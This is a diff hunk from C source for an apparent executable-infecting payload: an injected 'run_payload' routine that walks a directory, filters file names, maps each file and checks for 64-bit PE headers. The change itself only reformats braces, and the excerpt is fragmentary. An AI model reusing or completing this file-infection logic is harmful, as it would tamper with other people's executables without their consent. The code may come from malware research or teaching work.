@@ -63,17 +63,20 @@ INJECTED_CODE VOID run_payload(IN CONST HMODULE hKernel32Dll, IN CONST PCBYTE pP
     do {                                                                       \
         if (allowMb && bUseMsgbox) {                                           \
             pMessageBoxA(NULL, text, mbDbgTitle, MB_OK | MB_ICONINFORMATION);  \
-        } else {                                                               \
+        }                                                                      \
+        else {                                                                 \
             pWriteConsoleA(hStderr, text, (DWORD)my_strlen(text), NULL, NULL); \
         }                                                                      \
-    } while (0)
+    }                                                                          \
+    while (0)
 
 #define PRINT_DBG_NL()                                        \
     do {                                                      \
         if (!bUseMsgbox) {                                    \
             pWriteConsoleA(hStderr, sNewline, 1, NULL, NULL); \
         }                                                     \
-    } while (0)
+    }                                                         \
+    while (0)
 
 #else  // PL_DEBUG
 
@@ -146,7 +149,8 @@ INJECTED_CODE VOID run_payload(IN CONST HMODULE hKernel32Dll, IN CONST PCBYTE pP
 #ifdef NEED_BANG
             || sDirEnd[0] != '!'  // Skip file names not starting with '!' if `NEED_BANG` is defined
 #endif                            // NEED_BANG
-        ) {
+        )
+        {
             PRINT_DBG(msgSkipping);
             PRINT_DBG(sFilePath);
             PRINT_DBG_NL();
@@ -191,7 +195,8 @@ INJECTED_CODE VOID run_payload(IN CONST HMODULE hKernel32Dll, IN CONST PCBYTE pP
         pNtHeader = (PIMAGE_NT_HEADERS64)((PBYTE)pDosHeader + pDosHeader->e_lfanew);
         if (pNtHeader->Signature != IMAGE_NT_SIGNATURE ||
             pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ||
-            pNtHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
+            pNtHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
+        {
             goto invalid_pe;
         }
 
@@ -289,7 +294,8 @@ INJECTED_CODE VOID run_payload(IN CONST HMODULE hKernel32Dll, IN CONST PCBYTE pP
         pCloseHandle(hMapFile);
     close_file:
         pCloseHandle(hFile);
-    } while (pFindNextFileA(hFind, &findData));
+    }
+    while (pFindNextFileA(hFind, &findData));
 
     pFindClose(hFind);
 
